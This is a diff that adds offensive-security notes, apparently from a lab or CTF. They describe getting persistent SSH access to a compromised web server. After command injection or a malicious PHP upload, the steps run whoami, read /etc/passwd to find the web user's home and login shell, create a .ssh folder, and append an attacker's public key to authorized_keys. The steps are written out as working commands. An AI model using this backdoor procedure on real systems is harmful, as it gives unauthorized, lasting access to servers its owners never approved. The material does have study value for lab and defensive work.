@@ -92,7 +92,29 @@ success!!
   </BODY></HTML>
     
     
-    
+  SSH Key Setup
+Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for 
+password as well
+ ssh-keygen -t rsa
+After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
+ cat ~/.ssh/id_rsa.pub
+The entire output is your public key, make sure when uploading you copy everything
+Uploading SSH Key
+On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where 
+command injection is possible or if you uploaded some malicious php they can be done from there
+The following process is done on target through command injection or malicious upload.
+Find out what account is running the web sever/commands.
+ whoami
+Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. 
+For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.
+ www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.
+Check to see if .ssh folder is in the users home directory. If not make it
+ ls -la /users/home/directory      #check if .ssh exists
+ mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+Echo ssh key to the authorized_keys file in the users .ssh folder.
+ echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+Verify key has been uploaded successfully.
+ cat /users/home/directory/.ssh/authorized_keys  
     
     
     
